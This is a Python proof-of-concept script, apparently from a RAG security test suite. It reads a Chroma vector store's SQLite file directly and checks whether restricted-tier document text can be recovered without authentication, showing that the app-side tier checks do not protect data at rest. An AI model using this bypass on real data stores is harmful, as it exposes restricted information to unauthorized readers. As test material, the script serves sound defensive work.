#!/usr/bin/env python3
"""Phase 2 attack: no access control at the vector store.

Tier scoping is advisory, enforced only in the app layer (rag_chain.answer ->
vectorstore.query, which searches the tiers it is handed). Chroma itself has no
auth, and it persists every tier's chunk text in the clear in
data/chroma_db/chroma.sqlite3. Anyone with read access to that file recovers
restricted content without a login, a token, a clearance, or even the app
running — the whole authorization model is above the layer being read.

This is a local/filesystem attacker, not an HTTP client. The script opens the
SQLite file directly and pulls printable strings out of it (the same thing
`strings data/chroma_db/chroma.sqlite3 | grep -i northwind` does), then checks
whether restricted content is recoverable. No app import, no auth, no server.

SECURITY_FILTERS_ENABLED does not affect this: the bytes on disk are identical
in both phases. Exit 0 means restricted content was recovered from disk.

Config via env: CHROMA_SQLITE (defaults to the repo's store).
"""

from __future__ import annotations

import os
import re
import sys

SQLITE = os.environ.get("CHROMA_SQLITE", "data/chroma_db/chroma.sqlite3")

# Markers that, if present in the raw file, prove restricted content is stored in
# the clear: the restricted document's source path (self-labelled tier) and a
# fragment of its body.
TIER_LABEL = '"tier":"restricted"'
SOURCE_PATH = "restricted/acquisition.md"
BODY_FRAGMENT = "Northwind Systems"

_PRINTABLE = re.compile(rb"[\x20-\x7e]{6,}")


def _strings(path: str) -> str:
    try:
        with open(path, "rb") as fh:
            blob = fh.read()
    except FileNotFoundError:
        sys.exit(f"No store at {path} — run an ingest first, or set CHROMA_SQLITE.")
    return "\n".join(m.decode("ascii") for m in _PRINTABLE.findall(blob))


def main() -> int:
    print(f"[*] reading {SQLITE} directly — no auth, no app, no clearance")
    text = _strings(SQLITE)

    recovered = [
        name for name, marker in (
            ("tier label", TIER_LABEL),
            ("restricted source path", SOURCE_PATH),
            ("restricted body", BODY_FRAGMENT),
        )
        if marker in text
    ]

    if BODY_FRAGMENT in text:
        # Show one line of the recovered restricted content.
        line = next(l for l in text.splitlines() if BODY_FRAGMENT in l)
        print(f"[*] recovered: {line.strip()[:160]}")

    if recovered:
        print(f"\n[!] BYPASS — restricted content read straight off disk "
              f"(recovered: {', '.join(recovered)}). App-side tier scoping never applied.")
        return 0
    print("\n[ ] not found — no restricted markers in the store "
          "(is the restricted tier indexed?).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
